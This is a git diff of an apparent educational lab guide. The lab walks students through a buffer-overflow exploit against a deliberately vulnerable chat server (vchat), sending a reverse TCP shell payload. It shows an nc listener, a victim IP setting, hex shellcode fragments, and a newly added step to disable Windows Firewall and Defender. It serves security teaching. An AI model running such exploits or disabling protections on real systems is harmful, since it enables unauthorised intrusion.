@@ -272,13 +272,17 @@ The Python code is /home/kali/GenCyber/vchat/Attack/reverse-shell.py on Kali VM.
 This attack ubtilizes the buffer overflow vulnerability of the vulnerable chat server (i.e., vchat in our case) and sends a *reverse tcp shell* (one kind of malware code) payload, which connects back to the attacker and spawns a shell (Windows terminal) at the attacker's Kali VM.
 
 Here are steps:
- 
-1. To receive the reverse shell (i.e. Windows console), run the following command in a terminal on Kali VM
+
+1. Start the vulnerable chat server on Windows VM
+   - Turn off Windows Firewall
+   - Turn off the virus <a href="https://support.microsoft.com/en-us/windows/turn-off-defender-antivirus-protection-in-windows-security-99e6004f-c54c-8509-773c-a4d776b77960">real time protection</a>
+  
+2. To receive the reverse shell (i.e. Windows console), run the following command in a terminal on Kali VM
 ```
 nc -l -v -p 4444
 ``` 
 
-2. Change the following lines in reverse-shell.py
+3. Change the following lines in reverse-shell.py
 - Change the victim IP to your Windows VM's IP
 ```
 HOST = '10.0.2.7'   # vitcim IP
@@ -326,7 +330,7 @@ SHELL += b"\x27\xd1\x8d\x88\x22\x9d\x09\x61\x5f\x8e\xff\x85"
 SHELL += b"\xcc\xaf\xd5"
 ```
 
-3. Save reverse-shell.py and run the following command in the folder of /home/kali/GenCyber/vchat/Attack/ within another terminal
+4. Save reverse-shell.py and run the following command in the folder of /home/kali/GenCyber/vchat/Attack/ within another terminal
 ```
 python reverse-shell.py
 ```  
